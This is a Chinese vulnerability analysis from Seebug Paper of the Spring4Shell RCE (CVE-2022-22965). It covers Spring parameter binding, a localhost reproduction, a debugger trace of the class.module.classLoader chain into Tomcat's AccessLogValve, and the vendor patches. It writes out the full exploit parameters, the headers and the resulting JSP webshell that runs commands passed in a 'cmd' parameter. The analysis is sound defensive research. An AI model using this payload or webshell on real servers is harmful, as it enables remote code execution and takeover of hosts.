<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [paper.seebug.org](https://paper.seebug.org/1877/)

> 作者：麦兜 本文为作者投稿，Seebug Paper 期待你的分享，凡经采用即有礼品相送！ 投稿邮箱：paper@seebug.org

**作者：麦兜  
本文为作者投稿，Seebug Paper 期待你的分享，凡经采用即有礼品相送！ 投稿邮箱：paper@seebug.org**

上周网上爆出 Spring 框架存在 RCE 漏洞，野外流传了一小段时间后，Spring 官方在 3 月 31 日正式发布了漏洞信息，漏洞编号为 CVE-2022-22965。本文章对该漏洞进行了复现和分析，希望能够帮助到有相关有需要的人员进一步研究。

1.1 SpringMVC 参数绑定
------------------

为了方便编程，SpringMVC 支持将 HTTP 请求中的的请求参数或者请求体内容，根据`Controller`方法的参数，自动完成类型转换和赋值。之后，`Controller`方法就可以直接使用这些参数，避免了需要编写大量的代码从`HttpServletRequest`中获取请求数据以及类型转换。下面是一个简单的示例：

```
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;

@Controller
public class UserController {
    @RequestMapping("/addUser")
    public @ResponseBody String addUser(User user) {
        return "OK";
    }
}
```

```
public class User {
    private String name;
    private Department department;

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public Department getDepartment() {
        return department;
    }

    public void setDepartment(Department department) {
        this.department = department;
    }
}
```

```
public class Department {
    private String name;

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }
}
```

当请求为`/addUser?name=test&department.name=SEC`时，`public String addUser(User user)`中的`user`参数内容如下：

![](https://images.seebug.org/content/images/2022/04/06/1649228872000-1dtaqx.png-w331s)

可以看到，`name`自动绑定到了`user`参数的`name`属性上，`department.name`自动绑定到了`user`参数的`department`属性的`name`属性上。

注意`department.name`这项的绑定，表明 SpringMVC 支持多层嵌套的参数绑定。实际上`department.name`的绑定是 Spring 通过如下的调用链实现的：

```
User.getDepartment()
    Department.setName()
```

假设请求参数名为`foo.bar.baz.qux`，对应`Controller`方法入参为`Param`，则有以下的调用链：

```
Param.getFoo()
    Foo.getBar()
        Bar.getBaz()
            Baz.setQux() // 注意这里为set
```

SpringMVC 实现参数绑定的主要类和方法是`WebDataBinder.doBind(MutablePropertyValues)`。

1.2 Java Bean `PropertyDescriptor`
----------------------------------

`PropertyDescriptor`是 JDK 自带的`java.beans`包下的类，意为属性描述器，用于获取符合 Java Bean 规范的对象属性和 get/set 方法。下面是一个简单的例子：

```
import java.beans.BeanInfo;
import java.beans.Introspector;
import java.beans.PropertyDescriptor;

public class PropertyDescriptorDemo {
    public static void main(String[] args) throws Exception {
        User user = new User();
        user.setName("foo");

        BeanInfo userBeanInfo = Introspector.getBeanInfo(User.class);
        PropertyDescriptor[] descriptors = userBeanInfo.getPropertyDescriptors();
        PropertyDescriptor userNameDescriptor = null;
        for (PropertyDescriptor descriptor : descriptors) {
            if (descriptor.getName().equals("name")) {
                userNameDescriptor = descriptor;
                System.out.println("userNameDescriptor: " + userNameDescriptor);
                System.out.println("Before modification: ");
                System.out.println("user.name: " + userNameDescriptor.getReadMethod().invoke(user));
                userNameDescriptor.getWriteMethod().invoke(user, "bar");
            }
        }
        System.out.println("After modification: ");
        System.out.println("user.name: " + userNameDescriptor.getReadMethod().invoke(user));
    }
}
```

```
userNameDescriptor: java.beans.PropertyDescriptor[name=name; values={expert=false; visualUpdate=false; hidden=false; enumerationValues=[Ljava.lang.Object;@5cb9f472; required=false}; propertyType=class java.lang.String; readMethod=public java.lang.String cn.jidun.User.getName(); writeMethod=public void cn.jidun.User.setName(java.lang.String)]
Before modification: 
user.name: foo
After modification: 
user.name: bar
```

从上述代码和输出结果可以看到，`PropertyDescriptor`实际上就是 Java Bean 的属性和对应 get/set 方法的集合。

1.3 Spring `BeanWrapperImpl`
----------------------------

在 Spring 中，`BeanWrapper`接口是对 Bean 的包装，定义了大量可以非常方便的方法对 Bean 的属性进行访问和设置。

`BeanWrapperImpl`类是`BeanWrapper`接口的默认实现，`BeanWrapperImpl.wrappedObject`属性即为被包装的 Bean 对象，`BeanWrapperImpl`对 Bean 的属性访问和设置最终调用的是`PropertyDescriptor`。

```
import org.springframework.beans.BeanWrapper;
import org.springframework.beans.BeanWrapperImpl;

public class BeanWrapperDemo {
    public static void main(String[] args) throws Exception {
        User user = new User();
        user.setName("foo");
        Department department = new Department();
        department.setName("SEC");
        user.setDepartment(department);

        BeanWrapper userBeanWrapper = new BeanWrapperImpl(user);
        userBeanWrapper.setAutoGrowNestedPaths(true);
        System.out.println("userBeanWrapper: " + userBeanWrapper);

        System.out.println("Before modification: ");
        System.out.println("user.name: " + userBeanWrapper.getPropertyValue("name"));
        System.out.println("user.department.name: " + userBeanWrapper.getPropertyValue("department.name"));

        userBeanWrapper.setPropertyValue("name", "bar");
        userBeanWrapper.setPropertyValue("department.name", "IT");

        System.out.println("After modification: ");
        System.out.println("user.name: " + userBeanWrapper.getPropertyValue("name"));
        System.out.println("user.department.name: " + userBeanWrapper.getPropertyValue("department.name"));
    }
}
```

```
userBeanWrapper: org.springframework.beans.BeanWrapperImpl: wrapping object [cn.jidun.User@1d371b2d]
Before modification: 
user.name: foo
user.department.name: SEC
After modification: 
user.name: bar
user.department.name: IT
```

从上述代码和输出结果可以看到，通过`BeanWrapperImpl`可以很方便地访问和设置 Bean 的属性，比直接使用`PropertyDescriptor`要简单很多。

1.4 Tomcat `AccessLogValve` 和 `access_log`
------------------------------------------

Tomcat 的`Valve`用于处理请求和响应，通过组合了多个`Valve`的`Pipeline`，来实现按次序对请求和响应进行一系列的处理。其中`AccessLogValve`用来记录访问日志 access_log。Tomcat 的`server.xml`中默认配置了`AccessLogValve`，所有部署在 Tomcat 中的 Web 应用均会执行该`Valve`，内容如下：

```
<Valve class
               prefix="localhost_access_log" suffix=".txt"
               pattern="%h %l %u %t &quot;%r&quot; %s %b" />
```

下面列出配置中出现的几个重要属性： - directory：access_log 文件输出目录。 - prefix：access_log 文件名前缀。 - pattern：access_log 文件内容格式。 - suffix：access_log 文件名后缀。 - fileDateFormat：access_log 文件名日期后缀，默认为`.yyyy-MM-dd`。

2.1 复现环境
--------

*   操作系统：Ubuntu 18
*   JDK：11.0.14
*   Tomcat：9.0.60
*   SpringBoot：2.6.3

2.2 复现过程
--------

1.  创建一个 maven 项目，pom.xml 内容如下：

```
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <parent>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-parent</artifactId>
        <version>2.6.3</version>
        <relativePath/> <!-- lookup parent from repository -->
    </parent>
    <groupId>com.example</groupId>
    <artifactId>CVE-2022-22965</artifactId>
    <version>0.0.1-SNAPSHOT</version>
    <packaging>war</packaging>
    <dependencies>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-web</artifactId>
        </dependency>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-tomcat</artifactId>
            <scope>provided</scope>
        </dependency>
    </dependencies>
    <build>
        <plugins>
            <plugin>
                <groupId>org.springframework.boot</groupId>
                <artifactId>spring-boot-maven-plugin</artifactId>
            </plugin>
        </plugins>
    </build>
</project>
```

1.  项目中添加如下代码，作为 SpringBoot 的启动类：

```
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.boot.builder.SpringApplicationBuilder;
import org.springframework.boot.web.servlet.support.SpringBootServletInitializer;

@SpringBootApplication
public class ApplicationMain extends SpringBootServletInitializer {
    @Override
    protected SpringApplicationBuilder configure(SpringApplicationBuilder builder) {
        return builder.sources(ApplicationMain.class);
    }

    public static void main(String[] args) {
        SpringApplication.run(ApplicationMain.class, args);
    }
}
```

1.  将章节`1.1 SpringMVC参数绑定`中的`User`类和`UserController`类添加到项目中。
    
2.  执行 maven 打包命令，将项目打包为 war 包，命令如下：
    

```
mvn clean package
```

1.  将项目中 target 目录里打包生成的`CVE-2022-22965-0.0.1-SNAPSHOT.war`，复制到 Tomcat 的`webapps`目录下，并启动 Tomcat。
    
2.  从 [https://github.com/BobTheShoplifter/Spring4Shell-POC/blob/0c557e85ba903c7ad6f50c0306f6c8271736c35e/poc.py](https://github.com/BobTheShoplifter/Spring4Shell-POC/blob/0c557e85ba903c7ad6f50c0306f6c8271736c35e/poc.py) 下载 POC 文件，执行如下命令：
    

```
python3 poc.py --url http://localhost:8080/CVE-2022-22965-0.0.1-SNAPSHOT/addUser
```

1.  浏览器中访问`http://localhost:8080/tomcatwar.jsp?pwd=j&cmd=gnome-calculator`，复现漏洞。

![](https://images.seebug.org/content/images/2022/04/06/1649228873000-2gyffg.png-w331s)

3.1 POC 分析
----------

我们从 POC 入手进行分析。通过对 POC 中的`data` URL 解码后可以拆分成如下 5 对参数。

### 3.1.1 `pattern`参数

*   参数名：`class.module.classLoader.resources.context.parent.pipeline.first.pattern`
*   参数值：`%{c2}i if("j".equals(request.getParameter("pwd"))){ java.io.InputStream in = %{c1}i.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } %{suffix}i`

很明显，这个参数是 SpringMVC 多层嵌套参数绑定。我们可以推测出如下的调用链：

```
User.getClass()
    java.lang.Class.getModule()
        ......
            SomeClass.setPattern()
```

那实际运行过程中的调用链是怎样的呢？`SomeClass`是哪个类呢？带着这些问题，我们在前置知识中提到的实现 SpringMVC 参数绑定的主要方法`WebDataBinder.doBind(MutablePropertyValues)`上设置断点。

![](https://images.seebug.org/content/images/2022/04/06/1649228874000-3cpvfu.png-w331s)

经过一系列的调用逻辑后，我们来到`AbstractNestablePropertyAccessor`第 814 行，`getPropertyAccessorForPropertyPath(String)`方法。该方法通过递归调用自身，实现对`class.module.classLoader.resources.context.parent.pipeline.first.pattern`的递归解析，设置整个调用链。

我们重点关注第 820 行，`AbstractNestablePropertyAccessor nestedPa = getNestedPropertyAccessor(nestedProperty);`，该行主要实现每层嵌套参数的获取。我们在该行设置断点，查看每次递归解析过程中各个变量的值，以及如何获取每层嵌套参数。

![](https://images.seebug.org/content/images/2022/04/06/1649228875000-4ilmni.png-w331s)

#### 第一轮迭代

进入`getPropertyAccessorForPropertyPath(String)`方法前： - `this`：`User`的`BeanWrapperImpl`包装实例 - `propertyPath`：`class.module.classLoader.resources.context.parent.pipeline.first.pattern` - `nestedPath`：`module.classLoader.resources.context.parent.pipeline.first.pattern` - `nestedProperty`：`class`，即本轮迭代需要解析的嵌套参数

![](https://images.seebug.org/content/images/2022/04/06/1649228875000-5btvip.png-w331s)

进入方法，经过一系列的调用逻辑后，最终来到`BeanWrapperImpl`第 308 行，`BeanPropertyHandler.getValue()`方法中。可以看到`class`嵌套参数最终通过反射调用`User`的父类`java.lang.Object.getClass()`，获得返回`java.lang.Class`实例。

![](https://images.seebug.org/content/images/2022/04/06/1649228876000-6wxqle.png-w331s)

`getPropertyAccessorForPropertyPath(String)`方法返回后： - `this`：`User`的`BeanWrapperImpl`包装实例 - `propertyPath`：`class.module.classLoader.resources.context.parent.pipeline.first.pattern` - `nestedPath`：`module.classLoader.resources.context.parent.pipeline.first.pattern`，作为下一轮迭代的`propertyPath` - `nestedProperty`：`class`，即本轮迭代需要解析的嵌套参数 - `nestedPa`：`java.lang.Class`的`BeanWrapperImpl`包装实例，作为下一轮迭代的`this`

![](https://images.seebug.org/content/images/2022/04/06/1649228877000-7emhje.png-w331s)

经过第一轮迭代，我们可以得出第一层调用链：

```
User.getClass()
    java.lang.Class.get???() // 下一轮迭代实现
```

#### 第二轮迭代

![](https://images.seebug.org/content/images/2022/04/06/1649228878000-8chgbm.png-w331s)

![](https://images.seebug.org/content/images/2022/04/06/1649228879000-9gzvlg.png-w331s)

![](https://images.seebug.org/content/images/2022/04/06/1649228880000-10cvorg.png-w331s)

`module`嵌套参数最终通过反射调用`java.lang.Class.getModule()`，获得返回`java.lang.Module`实例。

经过第二轮迭代，我们可以得出第二层调用链：

```
User.getClass()
    java.lang.Class.getModule()
        java.lang.Module.get???() // 下一轮迭代实现
```

#### 第三轮迭代

![](https://images.seebug.org/content/images/2022/04/06/1649228882000-11zhlig.png-w331s)

![](https://images.seebug.org/content/images/2022/04/06/1649228883000-12jcrzw.png-w331s)

![](https://images.seebug.org/content/images/2022/04/06/1649228884000-13niqxk.png-w331s)

`classLoader`嵌套参数最终通过反射调用`java.lang.Module.getClassLoader()`，获得返回`org.apache.catalina.loader.ParallelWebappClassLoader`实例。

经过第三轮迭代，我们可以得出第三层调用链：

```
User.getClass()
    java.lang.Class.getModule()
        java.lang.Module.getClassLoader()
            org.apache.catalina.loader.ParallelWebappClassLoader.get???() // 下一轮迭代实现
```

接着按照上述调试方法，依次调试剩余的递归轮次并观察相应的变量，最终可以得到如下完整的调用链：

```
User.getClass()
    java.lang.Class.getModule()
        java.lang.Module.getClassLoader()
            org.apache.catalina.loader.ParallelWebappClassLoader.getResources()
                org.apache.catalina.webresources.StandardRoot.getContext()
                    org.apache.catalina.core.StandardContext.getParent()
                        org.apache.catalina.core.StandardHost.getPipeline()
                            org.apache.catalina.core.StandardPipeline.getFirst()
                                org.apache.catalina.valves.AccessLogValve.setPattern()
```

可以看到，`pattern`参数最终对应`AccessLogValve.setPattern()`，即将`AccessLogValve`的`pattern`属性设置为`%{c2}i if("j".equals(request.getParameter("pwd"))){ java.io.InputStream in = %{c1}i.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } %{suffix}i`，也就是 access_log 的文件内容格式。

我们再来看`pattern`参数值，除了常规的 Java 代码外，还夹杂了三个特殊片段。通过翻阅`AccessLogValve`的父类`AbstractAccessLogValve`的源码，可以找到相关的文档：

![](https://images.seebug.org/content/images/2022/04/598fe68b-b0e7-4f9a-b5be-18a42d50dd17.png-w331s)

即通过`AccessLogValve`输出的日志中可以通过形如`%{param}i`等形式直接引用 HTTP 请求和响应中的内容。完整文档请参考文章末尾的参考章节。

结合 poc.py 中`headers`变量内容：

```
headers = {"suffix":"%>//",
            "c1":"Runtime",
            "c2":"<%",
            "DNT":"1",
            "Content-Type":"application/x-www-form-urlencoded"
}
```

最终可以得到`AccessLogValve`输出的日志实际内容如下（已格式化）：

```
<%
if("j".equals(request.getParameter("pwd"))){
    java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
    int a = -1;
    byte[] b = new byte[2048];
    while((a=in.read(b))!=-1){
        out.println(new String(b));
    }
}
%>//
```

很明显，这是一个 JSP webshell。这个 webshell 输出到了哪儿？名称是什么？能被直接访问和正常解析执行吗？我们接下来看其余的参数。

### 3.1.2 `suffix`参数

*   参数名：`class.module.classLoader.resources.context.parent.pipeline.first.suffix`
*   参数值：`.jsp`

按照`pattern`参数相同的调试方法，`suffix`参数最终将`AccessLogValve.suffix`设置为`.jsp`，即 access_log 的文件名后缀。

### 3.1.3 `directory`参数

*   参数名：`class.module.classLoader.resources.context.parent.pipeline.first.directory`
*   参数值：`webapps/ROOT`

按照`pattern`参数相同的调试方法，`directory`参数最终将`AccessLogValve.directory`设置为`webapps/ROOT`，即 access_log 的文件输出目录。

这里提下`webapps/ROOT`目录，该目录为 Tomcat Web 应用根目录。部署到目录下的 Web 应用，可以直接通过`http://localhost:8080/`根目录访问。

### 3.1.4 `prefix`参数

*   参数名：`class.module.classLoader.resources.context.parent.pipeline.first.prefix`
*   参数值：`tomcatwar`

按照`pattern`参数相同的调试方法，`prefix`参数最终将`AccessLogValve.prefix`设置为`tomcatwar`，即 access_log 的文件名前缀。

### 3.1.5 `fileDateFormat`参数

*   参数名：`class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat`
*   参数值：空

按照`pattern`参数相同的调试方法，`fileDateFormat`参数最终将`AccessLogValve.fileDateFormat`设置为空，即 access_log 的文件名不包含日期。

### 3.1.5 总结

至此，经过上述的分析，结论非常清晰了：通过请求传入的参数，利用 SpringMVC 参数绑定机制，控制了 Tomcat `AccessLogValve`的属性，让 Tomcat 在`webapps/ROOT`目录输出定制的 “访问日志”`tomcatwar.jsp`，该 “访问日志” 实际上为一个 JSP webshell。

在 SpringMVC 参数绑定的实际调用链中，有几个关键点直接影响到了漏洞能否成功利用。

3.2 漏洞利用关键点
-----------

### 3.2.1 关键点一：Web 应用部署方式

从`java.lang.Module`到`org.apache.catalina.loader.ParallelWebappClassLoader`，是将调用链转移到 Tomcat，并最终利用`AccessLogValve`输出 webshell 的关键。

`ParallelWebappClassLoader`在 Web 应用以 war 包部署到 Tomcat 中时使用到。现在很大部分公司会使用 SpringBoot 可执行 jar 包的方式运行 Web 应用，在这种方式下，我们看下`classLoader`嵌套参数被解析为什么，如下图：

![](https://images.seebug.org/content/images/2022/04/06/1649228885000-15gfwwg.png-w331s)

可以看到，使用 SpringBoot 可执行 jar 包的方式运行，`classLoader`嵌套参数被解析为`org.springframework.boot.loader.LaunchedURLClassLoader`，查看其源码，没有`getResources()`方法。具体源码请参考文章末尾的参考章节。

这就是为什么本漏洞利用条件之一，Web 应用部署方式需要是 Tomcat war 包部署。

### 3.2.2 关键点二：JDK 版本

在前面章节中`AbstractNestablePropertyAccessor nestedPa = getNestedPropertyAccessor(nestedProperty);`调用的过程中，实际上 Spring 做了一道防御。

Spring 使用`org.springframework.beans.CachedIntrospectionResults`缓存并返回 Java Bean 中可以被`BeanWrapperImpl`使用的`PropertyDescriptor`。在`CachedIntrospectionResults`第 289 行构造方法中：

![](https://images.seebug.org/content/images/2022/04/06/1649228886000-16ewyaz.png-w331s)

该行的意思是：当 Bean 的类型为`java.lang.Class`时，不返回`classLoader`和`protectionDomain`的`PropertyDescriptor`。Spring 在构建嵌套参数的调用链时，会根据`CachedIntrospectionResults`缓存的`PropertyDescriptor`进行构建：

![](https://images.seebug.org/content/images/2022/04/06/1649228887000-17stdlu.png-w331s)

不返回，也就意味着`class.classLoader...`这种嵌套参数走不通，即形如下方的调用链：

```
Foo.getClass()
    java.lang.Class.getClassLoader()
        BarClassLoader.getBaz()
            ......
```

这在 JDK<=1.8 都是有效的。但是在 JDK 1.9 之后，Java 为了支持模块化，在`java.lang.Class`中增加了`module`属性和对应的`getModule()`方法，自然就能通过如下调用链绕过判断：

```
Foo.getClass()
    java.lang.Class.getModule() // 绕过
        java.lang.Module.getClassLoader()
            BarClassLoader.getBaz()
                ......
```

这就是为什么本漏洞利用条件之二，JDK>=1.9。

4.1 Spring 5.3.18 补丁
--------------------

通过对比 Spring 5.3.17 和 5.3.18 的版本，可以看到在 3 月 31 日有一项名为 “Redefine PropertyDescriptor filter 的” 提交。

![](https://images.seebug.org/content/images/2022/04/06/1649228887000-18iwnlm.png-w331s)

进入该提交，可以看到对`CachedIntrospectionResults`构造函数中 Java Bean 的`PropertyDescriptor`的过滤条件被修改了：当 Java Bean 的类型为`java.lang.Class`时，仅允许获取`name`以及`Name`后缀的属性描述符。在章节`3.2.2 关键点二：JDK版本`中，利用`java.lang.Class.getModule()`的链路就走不通了。

![](https://images.seebug.org/content/images/2022/04/06/1649228888000-19qrkrw.png-w331s)

4.2 Tomcat 9.0.62 补丁
--------------------

通过对比 Tomcat 9.0.61 和 9.0.62 的版本，可以看到在 4 月 1 日有一项名为 “Security hardening. Deprecate getResources() and always return null.” 提交。

![](https://images.seebug.org/content/images/2022/04/06/1649228888000-20muaoq.png-w331s)

进入该提交，可以看到对`getResource()`方法的返回值做了修改，直接返回`null`。`WebappClassLoaderBase`即`ParallelWebappClassLoader`的父类，在章节`3.2.1 关键点一：Web应用部署方式`中，利用`org.apache.catalina.loader.ParallelWebappClassLoader.getResources()`的链路就走不通了。

![](https://images.seebug.org/content/images/2022/04/06/1649228888000-21irivm.png-w331s)

通过将代码输出到日志文件，并控制日志文件被解释执行，这在漏洞利用方法中也较为常见。通常事先往服务器上写入包含代码的 “日志” 文件，并利用文件包含漏洞解释执行该 “日志” 文件。写入 “日志” 文件可以通过 Web 服务中间件自身的日志记录功能顺带实现，也可以通过 SQL 注入、文件上传漏洞等曲线实现。

与上文不同的是，本次漏洞并不需要文件包含。究其原因，Java Web 服务中间件自身也是用 Java 编写和运行的，而部署运行在上面的 Java Web 应用，实际上是 Java Web 服务中间件进程的一部分，两者间通过 Servlet API 标准接口在进程内部进行 “通讯”。依靠 Java 语言强大的运行期反射能力，给予了攻击者可以通过 Java Web 应用漏洞进而攻击 Java Web 服务中间件的能力。也就是本次利用 Web 应用自身的 Spring 漏洞，进而修改了 Web 服务中间件 Tomcat 的 access_log 配置内容，直接输出可执行的“日志” 文件到 Web 应用目录下。

在日常开发中，应该严格控制 Web 应用可解释执行目录为只读不可写，日志、上传文件等运行期可以修改的目录应该单独设置，并且不可执行。

本次漏洞虽然目前调用链中仅利用到了 Tomcat，但只要存在一个从 Web 应用到 Web 服务中间件的`class.module.classLoader....`合适调用链，理论上 Jetty、Weblogic、Glassfish 等也可利用。另外，目前通过写入日志文件的方式，也可能通过其它文件，比如配置文件，甚至是内存马的形式出现。

本次漏洞目前唯一令人 “欣慰” 的一点是，仅对 JDK>=1.9 有效。相信不少公司均为 “版本任你发，我用 Java 8！” 的状态，但这也仅仅是目前。与其抱着侥幸心理，不如按计划老老实实升级 Spring。

*   Tomcat access_log 配置参考文档：[https://tomcat.apache.org/tomcat-9.0-doc/config/valve.html#Access_Logging](https://tomcat.apache.org/tomcat-9.0-doc/config/valve.html#Access_Logging)
*   Spring 5.3.17 和 5.3.18 版本比较：[https://github.com/spring-projects/spring-framework/compare/v5.3.17...v5.3.18](https://github.com/spring-projects/spring-framework/compare/v5.3.17...v5.3.18)
*   Spring 5.3.18 补丁提交内容：[https://github.com/spring-projects/spring-framework/commit/002546b3e4b8d791ea6acccb81eb3168f51abb15](https://github.com/spring-projects/spring-framework/commit/002546b3e4b8d791ea6acccb81eb3168f51abb15)
*   Tomcat 9.0.61 和 9.0.62 版本比较：[https://github.com/apache/tomcat/compare/9.0.61...9.0.62](https://github.com/apache/tomcat/compare/9.0.61...9.0.62)
*   Tomcat 9.0.62 补丁提交内容：[https://github.com/apache/tomcat/commit/8a904f6065080409a1e00606cd7bceec6ad8918c](https://github.com/apache/tomcat/commit/8a904f6065080409a1e00606cd7bceec6ad8918c)
*   LaunchedURLClassLoader 源码：[https://github.com/spring-projects/spring-boot/blob/main/spring-boot-project/spring-boot-tools/spring-boot-loader/src/main/java/org/springframework/boot/loader/LaunchedURLClassLoader.java](https://github.com/spring-projects/spring-boot/blob/main/spring-boot-project/spring-boot-tools/spring-boot-loader/src/main/java/org/springframework/boot/loader/LaunchedURLClassLoader.java)

![](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg) 本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：[https://paper.seebug.org/1877/](https://paper.seebug.org/1877/)